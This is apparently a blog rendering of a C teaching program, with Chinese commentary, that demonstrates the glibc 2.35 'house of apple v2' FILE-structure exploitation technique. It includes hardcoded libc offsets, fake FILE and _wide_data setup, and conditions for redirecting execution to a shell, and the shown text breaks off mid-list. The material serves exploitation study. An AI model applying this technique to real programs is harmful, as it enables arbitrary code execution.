class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 23-3-16.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;util.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> exploit_mode 3</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;  sh&quot;</span>;</span><br><span class="line"><span class="type">char</span>* binsh2 = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示house of apple v2利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;测试于ubuntu 22.04，glibc版本：Ubuntu GLIBC 2.35-0ubuntu3.1。\n&quot;</span>);</span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;1. 原理介绍\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;与house of apple v1写堆地址不同，house of apple v2能够直接控制程序执行流。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;v2的函数调用链的前半部分与v1是相同的，都是使用exit函数调用到_IO_flush_all_lockp。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;再一次回顾_IO_flush_all_lockp这个函数的内容：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意这里的_IO_OVERFLOW()，这实际上是一个宏定义，内容如下：&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其主要功能是调用_IO_FILE_plus_complete中的vtable中的OVERFLOW函数，这是一个函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以注意到最终这里会调用IO_validate_vtable函数，这个函数是用于检测vtable的合法性的。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;有这个函数做检查，我们自己伪造的vtable很难绕过，因为它会检查vtable的地址是否在libc统一保存vtable的地址块中。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;而在house of apple v2中，我们使用的不是_IO_OVERFLOW，而是_IO_Wxxx，这是两类相似的函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;以_IO_WDOALLOCATE为例：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libioP.h)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define _IO_WIDE_JUMPS(THIS) \\\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;其中_IO_CAST_FIELD_ACCESS会直接取出对应的函数指针准备执行，因此可以看到这里就没有上面函数的检查。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;它会执行_IO_FILE-&gt;_wide_data-&gt;_wide_vtable中的函数。因此v2与v1同样利用了_wide_data。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此我们伪造_wide_data的_wide_vtable中的函数指针就可以达到控制函数执行流的目的。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;这也就能够解释为什么我们不能够直接伪造_IO_flush_all_lockp中处理的_IO_FILE结构体中的vtable指针。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;因为我们伪造的_IO_FILE无法通过vtable合法性检查。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;我们只能将vtable指针修改成libc中已有的其他vtable指针，这也是house of apple的关键步骤。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libio.h, line 121)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_wide_data\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_end;\t\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_base;\t/* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_backup_base;\t/* Pointer to first valid character of\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t   backup area */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_end;\t/* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_last_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt _codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t _shortbuf[1];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mconst struct _IO_jump_t *_wide_vtable;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;2. 几种利用方式介绍\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;经过上面的介绍，我们知道了house of apple v2的主要步骤：\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, UNDEFINED, <span class="string">&quot;a. 修改_IO_flush_all_lockp中处理的_IO_FILE的vtable为已有vtable，伪造_wide_data-&gt;_wide_vtable指针。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, UNDEFINED, <span class="string">&quot;b. 调用该vtable后期望能够调用到_wide_data-&gt;_wide_vtable中的函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;具体来看，有几条执行流能够让我们控制rip，下面就来一一介绍。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;参考资料：https://bbs.kanxue.com/thread-273832.htm\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;不过无论是哪一条路线，都需要获得libc的基地址：&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = get_libc_base();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\033[0m\n\n&quot;</span>, libc_base);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;还有两个堆地址，一个保存fake FILE，一个保存fake _wide_data vtable：&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>* <span class="title">fake_FILE</span> =</span> (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span>* <span class="title">fake_wide_data</span> =</span> (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\033[0m\n\n&quot;</span>, fake_FILE);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(WHITE, HIGHLIGHT, <span class="string">&quot;(1) _IO_wfile_overflow 路线\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这个函数指的是第a步中期待从已有vtable跳入的函数，下同。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;考虑到这个函数在不止一个vtable中都有出现，因此我们可以修改成多个vtable的值。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在/libio/wfileops.c中(line 1025, 1051, 1075)我们就能够找到3个vtable中包含该函数：\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;_IO_wfile_jumps、_IO_wfile_jumps_mmap、_IO_wfile_jumps_maybe_mmap。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们只需要随便选择1个覆盖掉_IO_list_all的vtable即可。&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在IDA中，我们只能找到_IO_wfile_jumps这个符号，地址为0x2160C0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;不过通过查看_IO_wfile_overflow函数的交叉引用，我们可以找到另外两个jumps的地址：0x215F40和0x216000。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;为了演示需要，本程序不在原有stderr的情况下修改，而是直接修改_IO_list_all指针值为自己伪造的_IO_FILE。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;首先介绍一下_IO_wfile_overflow函数的内容：\n\n&quot;</span>);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wfileops.c, line 405)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                <span class="string">&quot;wint_t\n&quot;</span></span><br><span class="line">                <span class="string">&quot;_IO_wfile_overflow (FILE *f, wint_t wch)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;f-&gt;_flags &amp; _IO_NO_WRITES) &quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot; /* SET ERROR, _IO_NO_WRITES = 8 */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_flags |= _IO_ERR_SEEN;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      __set_errno (EBADF);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  /* If currently reading or no buffer allocated. */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if ( &quot;</span>HIGHLIGHT_GREEN_HEAD<span class="string">&quot; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0&quot;</span>HIGHLIGHT_PURPLE_HEAD<span class="string">&quot;) // _IO_CURRENTLY_PUTTING = 0x800\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      /* Allocate a buffer if needed. */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      if (&quot;</span>HIGHLIGHT_GREEN_HEAD<span class="string">&quot;f-&gt;_wide_data-&gt;_IO_write_base == 0&quot;</span>HIGHLIGHT_PURPLE_HEAD<span class="string">&quot;)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot;_IO_wdoallocbuf (f);\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                <span class="string">&quot;\t  _IO_free_wbackup_area (f);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t\t     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  if (f-&gt;_IO_write_base == NULL)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t      _IO_doallocbuf (f);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      else\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  /* Otherwise must be currently reading.  If _IO_read_ptr\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     (and hence also _IO_read_end) is at the buffer end,\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     logically slide the buffer forwards one block (by setting\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     the read pointers to all point at the beginning of the\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     block).  This makes room for subsequent output.\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     Otherwise, set the read pointers to _IO_read_end (leaving\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     that alone, so it can continue to correspond to the\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t     external position). */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t  if (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t      f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t      f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t\tf-&gt;_wide_data-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\tf-&gt;_wide_data-&gt;_IO_read_end;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      if (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\n&quot;</span></span><br><span class="line">                <span class="string">&quot;\tf-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if (wch == WEOF)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    return _IO_do_flush (f);\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    /* Buffer is really full */\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    if (_IO_do_flush (f) == EOF)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == L&#x27;\\n&#x27;))\n&quot;</span></span><br><span class="line">                <span class="string">&quot;    if (_IO_do_flush (f) == EOF)\n&quot;</span></span><br><span class="line">                <span class="string">&quot;      return WEOF;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;  return wch;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;libc_hidden_def (_IO_wfile_overflow)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们要调用的是_IO_wallocatebuf函数：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 363)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wdoallocbuf (FILE *fp)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_RED_HEAD <span class="string">&quot;fp-&gt;_wide_data-&gt;_IO_buf_base)\n&quot;</span> HIGHLIGHT_PURPLE_HEAD</span><br><span class="line">                 <span class="string">&quot;    return;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (&quot;</span> HIGHLIGHT_GREEN_HEAD <span class="string">&quot;!(fp-&gt;_flags &amp; _IO_UNBUFFERED)&quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot;)    // _IO_UNBUFFERED == 0x2\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    if ((wint_t) &quot;</span> HIGHLIGHT_YELLOW_HEAD <span class="string">&quot; _IO_WDOALLOCATE (fp) &quot;</span> HIGHLIGHT_PURPLE_HEAD <span class="string">&quot; != WEOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t     fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;libc_hidden_def (_IO_wdoallocbuf)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这里的_IO_WDOALLOCATE也是一个宏定义，本质就是调用_wide_data中vtable表的函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;而且_IO_Wxxx的宏定义函数调用没有检查，因此我们才能伪造这个函数指针。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以看到这个函数指针的参数是FILE结构体本身，因此如果要在此调用system，需要在FILE开头写&#x27;/bin/sh&#x27;。\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;伪造FILE结构体与_wide_data的几条注意点：\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;A. FILE-&gt;mode = 0 (_IO_flush_all_lockp 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;B. FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base (_IO_flush_all_lockp 控制流判断条件)\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;C. FILE-&gt;_flags &amp; 0x8 == 0 (_IO_wfile_overflow 